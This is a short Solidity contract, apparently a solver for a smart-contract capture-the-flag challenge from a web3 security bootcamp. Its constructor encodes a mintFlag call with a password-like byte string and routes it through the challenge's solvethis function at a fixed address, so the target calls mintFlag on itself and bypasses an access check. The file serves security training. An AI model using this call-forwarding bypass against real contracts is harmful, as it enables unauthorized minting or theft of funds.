// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IChallenge15 {
    function solvethis(bytes memory data) external;

    function mintFlag(bytes memory data) external;
}

contract Challenge15Solver {
    constructor() {
        // Create the encoded mintFlag function call
        bytes memory mintFlagCalldata = abi.encodeWithSignature(
            "mintFlag(bytes)",
            hex"77656233736563626f6f7463616d700000000000000000000000000000000000"
        );

        // Call solvethis with the encoded mintFlag call
        IChallenge15(0xE72Af185203f768F8D2c100dCA6942f9E3443874).solvethis(
            mintFlagCalldata
        );
    }
}
